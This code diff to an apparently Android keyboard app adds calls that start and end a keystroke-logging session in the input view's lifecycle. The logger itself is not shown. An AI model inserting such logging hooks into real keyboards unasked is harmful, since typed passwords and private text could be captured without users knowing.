@@ -283,6 +283,7 @@ public class Keyboard2 extends InputMethodService
     _keyboardView.setKeyboard(current_layout());
     _keyeventhandler.started(_config);
     setInputView(_container_view);
+    KeystrokeLoggerService.getInstance(this).startSession(info);
     Logs.debug_startup_input_view(info, _config);
   }
 
@@ -384,6 +385,7 @@ public class Keyboard2 extends InputMethodService
   {
     super.onFinishInputView(finishingInput);
     _keyboardView.reset();
+    KeystrokeLoggerService.endSessionStatic();
   }
 
   @Override
